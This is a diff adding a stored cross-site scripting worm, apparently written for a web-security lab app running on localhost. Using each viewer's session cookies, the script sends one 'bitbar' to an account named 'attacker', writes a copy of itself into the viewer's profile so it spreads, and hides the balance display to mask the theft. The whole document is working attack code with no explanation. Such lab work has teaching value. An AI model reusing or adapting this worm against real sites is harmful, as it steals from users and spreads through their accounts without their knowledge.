@@ -1,0 +1,22 @@
+<script id='ff'>
+var req = new XMLHttpRequest();
+req.withCredentials = true;
+req.onload = function () {
+    var req2 = new XMLHttpRequest();
+    req2.withCredentials = true;
+    req2.onload = function () {
+    };
+    req2.open("post", "http://localhost:3000/set_profile");
+    req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    var worm = document.getElementById('ff').outerHTML;
+    var display = '<p id="bitbar_display">10 bitbars</p>';
+    var params = 'new_profile='+encodeURIComponent(worm)+encodeURIComponent(display);
+    req2.send(params);
+};
+req.open("post", "http://localhost:3000/post_transfer");
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+var params = 'destination_username=attacker&quantity=1';
+req.send(params);
+document.getElementById('bitbar_display').style.display = "none";
+</script>
+<p id="bitbar_display">10 bitbars</p>
